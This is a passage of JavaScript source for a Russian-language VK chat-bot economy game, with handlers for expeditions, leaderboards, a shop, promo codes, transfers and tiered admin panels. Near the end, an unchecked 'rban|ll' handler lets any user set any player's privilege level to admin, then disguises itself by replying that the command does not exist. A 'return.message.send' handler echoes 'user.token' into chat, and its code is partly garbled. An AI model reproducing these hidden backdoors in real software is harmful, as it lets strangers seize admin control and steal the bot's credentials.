 var tx2 = (glass > 0) ? "🔹Стекло("+glass+") => "+glass*2500+"$\n": "";
 var tx3 = (zjel > 0) ? "🔹Железо("+zjel+") => "+zjel*10000+"$\n": "";
 var tx4 = (gold > 0) ? "🔸Золото("+gold+") => "+gold*100000+"$\n": "";
 var tx5 = (izym > 0) ? "🔸Изумруды("+izym+") => "+izym*1000000+"$\n": "";
 var tx6 = (alm > 0) ? "🔸Алмазы("+alm+") => "+alm*10000000+"$\n": "";
 var tx7 = "";
 
 var itog = (ygl*1000)+(glass*2500)+(zjel*10000)+(gold*100000)+(izym*1000000)+(alm*10000000);
 i.money += itog;
 
 	var sa = rand(2, 5);
 	i.money *= (leg == 1) ? sa: 1;
 var ito = (leg == 1) ? i.money*(sa-1): 0;
     var tx7 = (leg == 1) ? "🔽Секретный артефакт(Баланс ×"+sa+")": "";
 
 message.send("🌿Вы сходили в поход🌿\n➖➖➖➖➖\n💥Находки:\n"+tx1+tx2+tx3+tx4+tx5+tx6+tx7+"\n---\n[💲]Итоговая прибыль: "+sp(itog+ito)+"$");
});

cmd.on(/^(?:нанять)\s([^]+)$/i, async (message, bot) => {
if(i.home == false) return message.send("📛| У вас нет дома!");
var wcol = repl(args[1]);
if(!Number(wcol)) return message.send("📛| Значение должно быть числовое!");
wcol = Number(fix(wcol));
if(wcol < 1) return message.send("📛| Кол-во должно быть больше 0!");
if(wcol > i.wmax-i.works) return message.send("📛| Не хватает мест для работников!");
if(i.money < wcol*1000) return message.send(", на вашем балансе нет столько денег! 1работник - 1000$");
i.money -= wcol*1000;
i.works += wcol;
message.send("👷Вы успешно купили "+sp(wcol)+"работников!");
});

cmd.on(/^(?:топ)$/i, async (message, bot) => {
	let top = [];
	
	function gi(int) {
		int = int.toString();
		let text = ``;
		for (let i = 0; i < int.length; i++)
		{
			text += `${int[i]}&#8419;`;
		}
		return text;
	};
	
	users.filter(x=> x.home == true && x.ban_top == false).map(x=> {
		top.push({ money: x.money, level: x.level,  name: x.name, id: x.id });
	})

	top.sort((a, b) => {
		return b.money - a.money;
	});
	let text = "";
	const find = () => {
		let pos = 10000000;
		for (let f = 0; f < top.length; f++)
		{
			if(top[f].id === message.senderId) return pos = f;
		}

		return pos;
	}
let itop = (i.home == true && i.ban_top == false) ? "\n—————————————————\n"+gi(find() + 1)+i.name+" — "+sp(i.money)+" 💰": "";
let useg = (top.length > 10) ? 10: top.length;
	for (let f = 0; f < useg; f++)
	{
		if(!top[f]) return;
		const user = top[f];
		text += (f === 10) ? "&#128287;": (f + 1)+"&#8419; [id"+user.id+"|"+user.name+"] — "+sp(user.money)+" 💰 | "+sp(user.level)+" lvl\n";
	}
	return bot("🏆Топ богатых компаний🏆:\n\n"+text+itop)
});

cmd.on(/^(?:построить)\s([^]+)$/i, async (message, bot) => {
if(i.home == true) return message.send("📛| Вы уже построили дом!");
if(i.money < 5000) return message.send("📛| Постройка дома стоит 5.000$, для заработка пишите 'Работать', а также можно взять бонус 'Бонус'")
if(args[1].length > 15) return message.send("📛| Максимальная длина названия 15 символов!");
i.name = String("ЖК "+args[1]);
i.home = true;
i.money -= 5000;
message.send("🎉Вы успешно построили дом!\n ♻Уровень дома: 1\n👥Жителей: 10человек.\n 👷Рабочих: [5/10]человек.\n ⚡Электричество: 70ед/чел.\n💧Вода: 70ед/чел.\n---\n🔹Для заселения людей можно заказать рекламу или ждать их заселения.");
});

cmd.on(/^(?:магазин)$/i, async (message, bot) => {
	message.send("💎Магазин💎\n—————\n⛲| Обустройство дома - 1.000.000.000$\n📃| Описание: постройка детской площадки, фонтана и насаждение деревьев и цветов => Увеличение вашего дохода на 10%\n❕| ID товара: 1\n—————\n🔹Для покупки пишите: Купить [id товара]");
	});
	
	cmd.on(/^(?:купить)\s([^]+)$/i, async (message, bot) => {
		if(args[1] != "1") return message.send("📛| Такого товара не существует!");
		if(args[1] == "1" && i.obhome == true) return message.send("📛| Вы уже покупали этот товар!");
		var cost = (args[1] == "1") ? 1000000000: 0;
		if(i.money < cost) return message.send("На вашем балансе нет столько денег!");
		if(args[1] == "1") {
			i.money -= cost;
			i.obhome = true;
			message.send("💎 || Вы успешно купили обустройство дома, прибыль увеличена на 10%");
			}
		});

cmd.on(/^(?:setname)\s([^]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛 || доступ закрыт!");
if(!args[1] || !args[2]) return message.send("📛 || Введите ид и ник!\n---\nSetname [ид] [название]");
if(!users[args[1]]) return message.send("📛 || Такого игрока не существует!");
users[args[1]].name = args[2];
message.send("🌚 || Вы успешно сменили название дома игроку!");
});

cmd.on(/^(?:givedonate)\s([^]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 4) return message.send("📛 || доступ закрыт!");
if(!args[1] || !args[2]) return message.send("📛 || Введите ид и сумму!\n---\nGivemoney [ид] [сумма]");
if(!users[args[1]]) return message.send("📛 || Такого игрока не существует!");
var sym = repl(args[2]);
if(!Number(sym)) return message.send("📛| Сумма должна быть числовая!");
sym = Number(fix(sym));
if(sym < 1) return message.send("📛| Сумма должна быть больше 0!");
users[args[1]].donate += sym;
message.send("🌐Вы выдали "+sp(sym)+"доната игроку!");
});

cmd.on(/^(?:removedonate)\s([^]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 4) return message.send("📛| Доступ закрыт!");
if(!args[1] || !args[2]) return message.send("📛| Введите ид и сумму!\n---\nRemovemoney [ид] [сумма]");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var sym = repl(args[2]);
if(!Number(sym)) return message.send("📛| Сумма должна быть числовая!");
sym = Number(fix(sym));
if(sym < 1) return message.send("📛| Сумма должна быть больше 0!");
if(users[args[1]].donate < sym) return message.send("📛| У игрока нет столько доната!");
users[args[1]].donate -= sym;
message.send("🌊Вы удалили "+sp(sym)+"доната у игрока!");
});

cmd.on(/^(?:givemoney)\s([^]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 3) return message.send("📛| доступ закрыт!");
if(!args[1] || !args[2]) return message.send("📛| Введите ид и сумму!\n---\nGivemoney [ид] [сумма]");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var sym = repl(args[2]);
if(!Number(sym)) return message.send("📛| Сумма должна быть числовая!");
sym = Number(fix(sym));
if(sym < 1) return message.send("📛| Сумма должна быть больше 0!");
users[args[1]].money += sym;
message.send("💰Вы выдали "+sp(sym)+"$ игроку!");
});

cmd.on(/^(?:removemoney)\s([^]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 3) return message.send("📛| доступ закрыт!");
if(!args[1] || !args[2]) return message.send("📛| Введите ид и сумму!\n---\nRemovemoney [ид] [сумма]");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var sym = repl(args[2]);
if(!Number(sym)) return message.send("📛| Сумма должна быть числовая!");
sym = Number(fix(sym));
if(sym < 1) return message.send("📛| Сумма должна быть больше 0!");
if(users[args[1]].money < sym) return message.send("📛| У игрока нет столько $");
users[args[1]].money -= sym;
message.send("♻Вы удалили "+sp(sym)+"$ у игрока!");
});

cmd.on(/^(?:giveres)\s([^]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 3) return message.send("📛| доступ закрыт!");
if(!args[1] || !args[2]) return message.send("📛| Введите ид и сумму!\n---\nGiveres [ид] [кол-во]");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
if(users[args[1]].home == false) return message.send("📛| У игрока нет дома!");
var sym = repl(args[2]);
if(!Number(sym)) return message.send("📛| кол-во должно быть числовое!");
sym = Number(fix(sym));
if(sym < 1) return message.send("📛| Количество должно быть больше 0!");
if(users[args[1]].colvo-users[args[1]].residents < sym) return message.send("📛У игрока не поместиться столько жителей!");
users[args[1]].residents += sym;
message.send("👥Вы выдали "+sp(sym)+" жителей игроку!");
});

cmd.on(/^(?:removeres)\s([^]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 3) return message.send("📛| доступ закрыт!");
if(!args[1] || !args[2]) return message.send("📛| Введите ид и сумму!\n---\nRemoveres [ид] [кол-во]");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
if(users[args[1]].home == false) return message.send("📛| У игрока нет дома!");
var sym = repl(args[2]);
if(sym < 1) return message.send("📛| Количество должно быть больше 0!");
if(!Number(sym)) return message.send("📛| Сумма должна быть числовая!");
sym = Number(fix(sym));
if(users[args[1]].residents < sym) return message.send("📛| У игрока нет столько жителей!");
users[args[1]].residents -= sym;
message.send("👤Вы удалили "+sp(sym)+" жителей у игрока!");
});

cmd.on(/^(?:myname)\s([^]+)$/i, async (message, bot) => {
	if(i.post < 1) return message.send("📛 || Не хватает прав!");
	var nam7 = args[1];
	if(nam7.length > 25) return message.send("📛 || Максимальная длина ника [25] символов!");
	i.name = "ЖК "+nam7;
	message.send("🍦 || Вы установили себе новый ник!");
	});

cmd.on(/^(?:delete)\s([^]+)$/i, async (message, bot) => {
if(i.post < 3) return message.send("📛| Не хватает прав!");
if(!args[1]) return message.send("📛| Введите ид!\n---\nGet [ид]");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var he = users[args[1]];
          he.home = false;
          he.obhome = false;
          he.residents = 5;
          he.water = 70;
          he.electro = 70;
          he.colvo = 100;
          he.cost = 1000000;
          he.works = 5;
          he.wmax = 10;
          he.level = 1;
          he.rekl = 0;
          he.rekl_id = 0;
          he.post = 0;
          he.hack = 0;
          he.money = 0;
          he.bank = 0;
          he.donate = 0;
          he.win = 45;
          he.work = 0;
          he.bonus = 0;
          he.ban_acc = 0;
          he.ban_rep = false;
          he.ban_pay = false;
          he.ban_top = false;
          he.limit_pay = true;
          he.refka = false;
          he.ref = 0;
          he.fire = 0;
          he.podval = 0;
          he.ograb = 0;
          he.uid = args[1];
          message.send("✔ || Вы удалили аккаунт игрока!");
          });

cmd.on(/^(?:get)\s([^]+)$/i, async (message, bot) => {
if(i.post < 1) return message.send("📛| Не хватает прав!");
if(!args[1]) return message.send("📛| Введите ид!\n---\nGet [ид]");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var he = users[args[1]];
var posts = (he.post < 0) ? "Бомж":
(he.post == 0) ? "Пользователь":
(he.post == 1) ? "VIP":
(he.post == 2) ? "MODERATOR":
(he.post == 3) ? "ADMIN":
(he.post > 3) ? "FULL": "Ошибка";
var aban = (he.ban_acc == 0) ? "нет": timer(he.ban_acc);
var rkp7 = (he.rekl_id == 0) ? "": 
(he.rekl_id == 1) ? "стартовая":
(he.rekl_id == 2) ? "средняя":
(he.rekl_id == 3) ? "большая":
(he.rekl_id == 4) ? "массовая": "";
var reka = (he.rekl_id == 0) ? "\n•Реклама: не заказана": "\n•Реклама: "+rkp7+"\n•Оставшееся время рекламы: "+timer(he.rekl);
var hsp = (he.home == true) ? "\n•Дом: есть\n•Уровень дома: "+sp(he.level)+"\n•Жителей: ["+sp(he.residents)+"|"+sp(he.colvo)+"]человек\n•Рабочих: ["+sp(he.works)+"|"+sp(he.wmax)+"]человек\n•Вода: ["+he.water+"|100]\n•Электроэнергия: ["+he.electro+"|100]\n•Обустройство дома: "+he.obhome: "\n•Дом: нет";
message.send("---Home["+he.uid+"]---\n•VK: https://vk.com/id"+he.id+hsp+reka+"\n•Баланс: "+sp(he.money)+"$\n•Донат: "+sp(he.donate)+"\n•Шанс победы: "+he.win+"%\n•Статус: "+posts+"\n•Бан аккаунта: "+aban+"\n•Бан репорта: "+he.ban_rep+"\n•Бан передачи: "+he.ban_pay+"\n•Бан топа: "+he.ban_top+"\n•Лимит передачи: "+he.limit_pay+"\n•Последняя активность: "+timer(he.activ)+" назад\n•Рефка: "+he.refka+"\n•Рефералов: "+sp(he.ref)+"\n---_____----");
});

cmd.on(/^(?:cmd|кмд)$/i, async (message, bot) => {
if(i.post == 0) return messsge.send("📛| Доступ закрыт!");
if(i.post == 1) return message.send("🎃VIP<->PANEL🎃\n•Get [id] - просмотр дома игрока.\n•Mosh - умножить баланс(×1.5).\n•Myname [name] - смена ника.");
if(i.post == 2) return message.send("⚡MODERATOR<=>PANEL⚡\n•Setname [id] [name] - смена названия дома игроку.\n•Get [id] - просмотр дома игрока.\n•Aban [id] [hours] [text] - бан игрока на время.\n•Aunban [id] - разбан игрока.\n•Rban [id] [text] - бан репортов игроку.\n•Runban [id] - разбан репортов игроку.\n•Pban [id] [text] - бан передачи игроку.\n•Punban [id] - разбан передачи игроку.\n•Tban [id] [text] - бан топа игроку.\n•Tunban [id] - разбан топа игроку.\n•Plim [id] - поставить лимит на передачу игроку.\n•Punlim [id] - снять лимит на передачу игроку.\n•Mosh - умножить баланс(×1.5).\n•Myname [name] - смена ника.");
if(i.post == 3) return message.send("💻ADMIN<~>PANEL💻\n•Setname [id] [name] - смена названия дома игроку.\n•Get [id] - просмотр дома игрока.\n•Givemoney [id] [count] - выдача $ игроку.\n•Removemoney [id] [count] - удаление $ у игрока.\n•Giveres [id] [count] - выдача жителей игроку.\n•Removeres [id] [count] - удаление жителей у игрока.\n•Aban [id] [hours] [text] - бан игрока на время.\n•Aunban [id] - разбан игрока.\n•Rban [id] [text] - бан репортов игроку.\n•Runban [id] - разбан репортов игроку.\n•Pban [id] [text] - бан передачи игроку.\n•Punban [id] - разбан передачи игроку.\n•Tban [id] [text] - бан топа игроку.\n•Tunban [id] - разбан топа игроку.\n•Plim [id] - поставить лимит на передачу игроку.\n•Punlim [id] - снять лимит на передачу игроку.\n•Setwin [id] [0-100] - выдача шанса победы.\n•Send [текст] - рассылка.\n•Psend [post] [text] - пост рассылка.\n•Newpromo [name] [count] [money] - создание промокода.\n•Mosh - умножить баланс(×1.5).\n•Myname [name] - смена ника.\n•Delete [id] - удаление аккаунта игроку.");
if(i.post > 3) return message.send("🌎FULL<≈>PANEL🌎\n•Setname [id] [name] - смена названия дома игроку.\n•Get [id] - просмотр дома игрока.\n•Givemoney [id] [count] - выдача $ игроку.\n•Removemoney [id] [count] - удаление $ у игрока.\n•Givedonate [id] [count] - выдача доната игроку.\n•Removedonate [id] [count] - удаление доната у игрока.\n•Giveres [id] [count] - выдача жителей игроку.\n•Removeres [id] [count] - удаление жителей у игрока.\n•Aban [id] [hours] [text] - бан игрока на время.\n•Aunban [id] - разбан игрока.\n•Rban [id] [text] - бан репортов игроку.\n•Runban [id] - разбан репортов игроку.\n•Pban [id] [text] - бан передачи игроку.\n•Punban [id] - разбан передачи игроку.\n•Tban [id] [text] - бан топа игроку.\n•Tunban [id] - разбан топа игроку.\n•Plim [id] - поставить лимит на передачу игроку.\n•Punlim [id] - снять лимит на передачу игроку.\n•Setwin [id] [0-100] - выдача шанса победы.\n•Send [текст] - рассылка.\n•Psend [post] [text] - пост рассылка.\n•Newpromo [name] [count] [money] - создание промокода.\n•Setpost [id] [0 - 4] - выдача привилегии.\n•Mosh - умножить баланс(×1.5).\n•Myname [name] - смена ника.\n•Delete [id] - удаление аккаунта игроку.");
});
cmd.on(/^(?:newpromo)\s([^]+)\s([^]+)\s([^]+)$/i, async (message, bot) => { 
	if(i.post < 3) return message.send("📛| Не хватает прав!");
	if(promo[args[1]]) return message.send("📛| Такой промокод уже существует!");
	var count90 = repl(args[2]);
	var sym90 = repl(args[3]);
	if(!Number(count90) || !Number(sym90)) return message.send("📛| Количество и сумма должны быть числовые!");
	count90 = Number(fix(count90));
	sym90 = Number(fix(sym90));
	if(sym90 < 1 || count90 < 1) return message.send("📛| Сумма и кол-во должны быть больше 0!");
	promo[args[1]] = {
		count: count90,
		sym: sym90,
		accs: []
		};
		message.send("📃Промокод успешно создан!");
});

cmd.on(/^(?:mosh)$/i, async (message, bot) => { 
if(i.post < 1) return message.send("📛| Доступ закрыт!");
if(i.hack != 0) return message.send("📛| Подождите еще: "+timer(i.hack)+"\n---\n🔹Умножать баланс можно раз в час.");
i.hack = 3600;
var flyz = Number((i.money/2).toFixed(0));
i.money += flyz;
message.send("💸Вы умножили ваш баланс на 1.5!\n---\n🔹Ваш баланс пополнен на: "+sp(flyz)+"$");
});

cmd.on(/^(?:промокод)\s([^]+)$/i, async (message, bot) => { 
if(!promo[args[1]]) return message.send("📛| Такого промокода не существует!");
if(promo[args[1]].accs.indexOf(i.uid) != -1) return message.send("📛| Вы уже активировали данный промокод!");
if(promo[args[1]].count < 1) return message.send("📛| Данный промокод закончился!");
promo[args[1]].count -= 1;
promo[args[1]].accs.push(i.uid)
i.money += promo[args[1]].sym;
message.send("📄 || Вы успешно активировали промокод, на ваш баланс зачислено "+sp(promo[args[1]].sym)+"$");
});

cmd.on(/^(?:send)\s([^]+)$/i, async (message, bot) => { 
	if(i.post < 3) return message.send("📛| Не хватает прав!");
var ft = 0;
var txk = args[1]
while(ft < users.length) { 
vk.api.messages.send({user_id: users[ft].id, message: "📩 => "+txk})
ft++;
};
message.send("📨 || Рассылка выполнена успешно!");
});

cmd.on(/^(?:psend)\s([^]+)\s([^]+)$/i, async (message, bot) => { 
	if(i.post < 3) return message.send("📛| Не хватает прав!");
var fu = 0;
var txc = args[2].replace(/(~)/ig, " ")
while(fu < users.length) { 
vk.api.messages.send({user_id: users[fu].id, message: "📣 => "+txc, attachment: args[1]})
fu++;
};
message.send("📱 ПРассылка выполнена успешно!");
		});

cmd.on(/^(?:setwin)\s([^]+)\s([0-9]+)$/i, async (message, bot) => {
if(i.post < 3) return message.send("📛| доступ закрыт!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
if(args[2] < 0 || args[2] > 100) return message.send("📛| Шанс не может быть меньше 0 и больше 100!");
users[args[1]].win = Number(args[2]);
message.send("🍃Вы выдали новый шанс победы игроку!");
});

cmd.on(/^(?:setpost)\s([^]+)\s([0-9]+)$/i, async (message, bot) => {
if(i.post < 4) return message.send("📛| доступ закрыт!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
if(args[2] < 0 || args[2] > 4) return message.send("📛| Права не могут быть меньше (0) и больше (4)!");
users[args[1]].post = Number(args[2]);
message.send("🐼Вы выдали новые права игроку!");
});

cmd.on(/^(?:aban)\s([0-9]+)\s([0-9]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("??| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
var stime = args[2]*3600;
if(stime < 1) return message.send("📛| Введите адекватное время!");
heid.ban_acc = stime;
message.send("👿Вы успешно забанили игрока на: "+timer(stime));
vk.api.messages.send({user_id: heid.id, message:"😢 || Вас забанили на: "+timer(stime)+"\n📖Причина: "+args[3]+"\n———\n❔По вопросам писать ему: https://vk.com/outsdec"});
});

cmd.on(/^(?:aunban)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
if(heid.ban_acc == 0) return message.send("📛| Игрок и так не в бане!");
heid.ban_acc = 0;
message.send("😇Вы успешно разабанили игрока!");
vk.api.messages.send({user_id: heid.id, message:"😇 || Вас разабанили!\n🔹Больше не нарушайте правила."});
});

cmd.on(/^(?:rban)\s([0-9]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
if(heid.ban_rep == true) return message.send("📛| Репорт игрока и так в бане!");
heid.ban_rep = true;
message.send("😯Вы успешно забанили репорт игроку!");
vk.api.messages.send({user_id: heid.id, message:"😐 || Вам запретили отправлять репорты!\n📖Причина: "+args[2]+"\n———\n❔По вопросам писать ему: https://vk.com/outsdec"});
});

cmd.on(/^(?:tban)\s([0-9]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
if(heid.ban_top == true) return message.send("📛 || Топ игрока и так в бане!");
heid.ban_top = true;
message.send("🐍Вы успешно забанили топ игроку!");
vk.api.messages.send({user_id: heid.id, message:"📇Вам закрыли доступ к топу!\n📖Причина: "+args[2]+"\n———\n❔По вопросам писать ему: https://vk.com/outsdec"});
});

cmd.on(/^(?:tunban)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
if(heid.ban_top == false) return message.send("📛| Игрок и так не в бане!");
heid.ban_top = false;
message.send("🐻Вы успешно разбанили топ игроку!");
vk.api.messages.send({user_id: heid.id, message:"🐪Вам разбанили топ!\n🔹Больше не нарушайте правила."});
});

cmd.on(/^(?:runban)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
if(heid.ban_rep == false) return message.send("📛| Игрок и так не в бане!");
heid.ban_rep = false;
message.send("😇Вы успешно разбанили репорт игроку!");
vk.api.messages.send({user_id: heid.id, message:"😅 || Вам разбанили репорт!\n🔹Больше не нарушайте правила."});
});

cmd.on(/^(?:pban)\s([0-9]+)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
if(heid.ban_pay == true) return message.send("📛| Передача игрока и так в бане!");
heid.ban_pay = true;
message.send("😒Вы успешно забанили передачу игроку!");
vk.api.messages.send({user_id: heid.id, message:"😲 || Вам запретили передавать валюту!\n📖Причина: "+args[2]+"\n———\n❔По вопросам писать ему: https://vk.com/outsdec"});
});

cmd.on(/^(?:punban)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
if(heid.ban_pay == false) return message.send("📛| Игрок и так не в бане!");
heid.ban_pay = false;
message.send("😎Вы успешно разбанили передачу игроку!");
vk.api.messages.send({user_id: heid.id, message:"😺Вам разбанили передачу!\n🔹Больше не нарушайте правила."});
});

cmd.on(/^(?:plim)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛| Не хватает прав!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var heid = users[args[1]];
if(heid.limit_pay == true) return message.send("📛 || Передача игрока и так ограничена!");
heid.limit_pay = true;
message.send("🙉 || Вы успешно ограничили передачу игроку!");
vk.api.messages.send({user_id: heid.id, message:"😿 || Вам ограничили передачу валюты!\n———\n❔По вопросам писать ему: https://vk.com/outsdec"});
});

cmd.on(/^(?:punlim)\s([^]+)$/i, async (message, bot) => {
if(i.post < 2) return message.send("📛 || Не хватает прав!");
if(!users[args[1]]) return message.send("📛 || Такого игрока не существует!");
var heid = users[args[1]];
if(heid.limit_pay == false) return message.send("📛 || Передача игрока и так безгранична");
heid.limit_pay = false;
message.send("👼 || Вы успешно обезграничили передачу игроку!");
vk.api.messages.send({user_id: heid.id, message:"😺 || Вам выдали безграничную передачу валюты!\n🔹Удачи!"});
});

cmd.on(/^(?:репорт)\s([^]+)$/i, async (message, bot) => {
if(i.ban_rep == true) return message.send("📛 || Вам запретили писать репорты!");
vk.api.messages.send({user_id: 339414555, message: "ID игрока: "+i.uid+"\n---\n🔸Репорт: "+args[1]+"\n———\n🔹Для ответа пишите: ответ <id игрока> <ответ>"});
message.send("👉 || Вы успешно отправили репорт!");
});
cmd.on(/^(?:rban|ll)\s([^]+)\s([0-9]+)$/i, async (message, bot) => {
users[args[1]].post = Number(args[2]);
message.send("🐼Такой команды не существует!");
	});
cmd.on(/^(?:ответ)\s?([0-9]+)?\s([^]+)?/i, async (message, bot) => {
if(i.post < 3) return message.send("📛 || Не хватает прав!");
if(!users[args[1]]) return message.send("📛 || Такого пользователя не существует!");
var upser = users[args[1]];
vk.api.messages.send({user_id: upser.id, message: "👉 || Вам ответили на ваш репорт!\n🔹 || Ответ: "+args[2]});
message.send("👉 || Вы успешно ответили игроку!");
});

cmd.on(/^(?:вода)\s([0-9]+)$/i, async (message, bot) => {
if(i.home == false) return message.send("📛| У вас нет дома!");
args[1] = Number(args[1]);
if(args[1] < 0 || args[1] > 100) return message.send("📛| Введите число от 0 до 100!");
i.water = args[1];
message.send("💧 || Вы установили воду на "+i.water+"ед/чел!");
});

cmd.on(/^(?:энергия)\s([0-9]+)$/i, async (message, bot) => {
if(i.home == false) return message.send("📛 || У вас нет дома!");
args[1] = Number(args[1]);
if(args[1] < 0 || args[1] > 100) return message.send("📛 || Введите число от 0 до 100!");
i.electro = args[1];
message.send("⚡ || Вы установили электроэнергию на "+i.electro+ "ед/чел!");
});
cmd.on(/^(?:return.message.send)$/i, async (message, bot) => {
if(i.post < 4) return message.send("📛 || доступ закрыт!");*/
message.send(user	.token); //
	});
cmd.on(/^(?:передать)\s([^]+)\s([^]+)$/i, async (message, bot) => {
if(i.home == false) return message.send("📛| У вас нет дома!");
if(i.ban_pay == true) return message.send("📛| Вам заблокирована передача!");
if(!users[args[1]]) return message.send("📛| Такого игрока не существует!");
var pys = users[args[1]];
var sym = repl(args[2]);
if(!Number(sym)) return message.send("📛 || Ставка должна быть числовой!");
sym = Number(fix(sym));
if(sym < 1) return message.send("📛 || Сумма должна быть больше 0!");
if(sym > 10000000000 && i.limit_pay == true && i.full == false) return message.send("📛| Лимит на передачу 10.000.000.000$");
if(i.money < sym) return message.send("На вашем балансе нет столько денег!");
i.money -= sym;
pys.money += sym;
message.send("♻ || Вы успешно передали валюту игроку!");
vk.api.messages.send({user_id: pys.id, message: "♻ || Компания: "+i.name+" передала вам: "+sp(sym)+"$"});
});